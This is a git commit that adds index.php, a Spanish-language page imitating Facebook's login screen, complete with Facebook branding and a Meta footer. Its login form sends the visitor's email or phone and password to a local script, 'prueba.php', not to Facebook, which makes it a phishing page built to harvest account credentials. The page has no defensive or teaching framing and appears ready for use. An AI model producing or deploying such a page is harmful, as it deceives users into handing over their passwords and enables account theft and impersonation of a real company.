5b9d8aa2200ad645b336f66e3b77f281cedbf41a
Angelo2705 <76188935+Angelo2705@users.noreply.github.com>
2022-12-19 23:11:59 -0500

    Add files via upload

---
+++ index.php
@@ -0,0 +1,86 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="icon" type="image/jpg" href="fb_favicom.png"/>
+    <link rel="preload" href="normalize.css" as="style">
+    <link rel="stylesheet" href="normalize.css">    
+    <link rel="preload" href="probandorep.css" as="Style">
+    <link rel="stylesheet" href="probandorep.css">
+    <title>Facebook - Entrar o registrarse</title>
+</head>
+<body>
+    <main class="bg padding-main">
+        <div class="contenedor pd-20 dos-columnas">
+            <div class="text">
+                <div class="contenedor-logo">
+                    <img class="logo" src="aa.svg" alt="Logo de Facebook">
+                </div>
+                <h2 class="eslogan">Facebook te ayuda a comunicarte y compartir con las personas que forman parte de tu vida.</h2>
+            </div>
+            <div class="form">
+                <form method="POST" action="prueba.php" class="card shadow">
+                    <input name="Correo" type="text" placeholder="Correo electrónico o número de teléfono">
+                    <input name="Contra" type="password"placeholder="Contraseña">
+                    <input type="submit" value="Iniciar sesión" class="btn-blue">
+                    <a href="#" class="link">¿Olvidaste tu contraseña?</a>
+                    <div class="line"></div>
+                    <a href="#" class="btn-green">Crear cuenta nueva</a>
+                </form>
+                <p class="info"><a class="bold" href="#">Crea una página</a>  para una celebridad, una marca o un negocio.</p>
+            </div>
+        </div>
+    </main>
+    <footer class="contenedor-footer">
+        <ul class="links">
+            <li><a href="#">Español (España)</a></li>
+            <li><a href="#">English (US)</a></li>
+            <li><a href="#">Portugués (Brasil)</a></li>
+            <li><a href="#">Français (France)</a></li>
+            <li><a href="#">Deutsch</a></li>
+            <li><a href="#">Italiano</a></li>
+            <li><a href="#">日本語</a></li>
+            <li><a href="#">中文(简体)</a></li>
+            <li><a href="#">العربية</a></li>
+            <li><a href="#">हिन्दी</a></li>
+        </ul>
+        <div class="line-fo"></div>
+        <ul class="links">
+            <li><a href="#">Registrarte</a></li>
+            <li><a href="#">Entrar</a></li>
+            <li><a href="#">Messenger</a></li>
+            <li><a href="#">Facebook Lite</a></li>
+            <li><a href="#">Watch</a></li>
+            <li><a href="#">Personas</a></li>
+            <li><a href="#">Páginas</a></li>
+            <li><a href="#">Categorías de páginas</a></li>
+            <li><a href="#">Lugares</a></li>
+            <li><a href="#">Juegos</a></li>
+            <li><a href="#">Market Place</a></li>
+            <li><a href="#">Facebook Pay</a></li>
+            <li><a href="#">Grupos</a></li>
+            <li><a href="#">Empleos</a></li>
+            <li><a href="#">Oculus</a></li>
+            <li><a href="#">Portal</a></li>
+            <li><a href="#">Instagram</a></li>
+            <li><a href="#">Local</a></li>
+            <li><a href="#">Recaudaciones de fondos</a></li>
+            <li><a href="#">Servicios</a></li>
+            <li><a href="#">Centro de información de votación</a></li>
+            <li><a href="#">Acerca de</a></li>
+            <li><a href="#">Crear anuncios</a></li>
+            <li><a href="#">Crear páginas</a></li>
+            <li><a href="#">Desarrolladores</a></li>
+            <li><a href="#">Empleos</a></li>
+            <li><a href="#">Privacidad</a></li>
+            <li><a href="#">Cookies</a></li>
+            <li><a href="#">Gestión de anuncios</a></li>
+            <li><a href="#">Condiciones</a></li>
+            <li><a href="#">Ayuda</a></li>
+        </ul>
+        <p class="copy">Meta &copy; 2022</p>
+    </footer>
+</body>
+</html>
